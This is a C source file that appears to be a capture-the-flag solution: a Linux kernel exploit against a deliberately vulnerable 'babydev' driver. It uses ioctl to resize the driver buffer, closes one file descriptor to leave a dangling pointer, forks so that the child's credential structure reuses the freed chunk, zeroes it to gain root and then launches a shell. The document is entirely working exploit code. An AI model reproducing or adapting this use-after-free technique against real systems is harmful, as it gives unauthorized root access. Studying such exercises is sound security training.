#include <stdio.h>
#include <fcntl.h> // O_RDWR 
#include <unistd.h> // open(), write()
#include <stdlib.h> // exit()
#include <sys/ioctl.h> // ioctl()
#include <sys/wait.h> // wait()

int main()
{
    int fd1, fd2, pid;
    char fake_cred[30] = {0};

    // babyopen() - kmalloc 68 heap chunk
    fd1 = open("/dev/babydev", O_RDWR);
    fd2 = open("/dev/babydev", O_RDWR);

    // babyioctl() - kmalloc 168 heap chunk
    ioctl(fd1, 65537, 168);

    // babyrelease() - device_buf point 168 heap chunk (dangling pointer)
    close(fd1);
    
    // struct cred allocate in 168 heap chunk 
    pid = fork();
    if(pid< 0)
    {
        printf("[-] fork error\n");
        exit(0);
    }
    else if(pid == 0)
    {
        write(fd2, fake_cred, 28);
        system("/bin/sh");
        exit(0);
    }
    close(fd2);
    return 0;
}
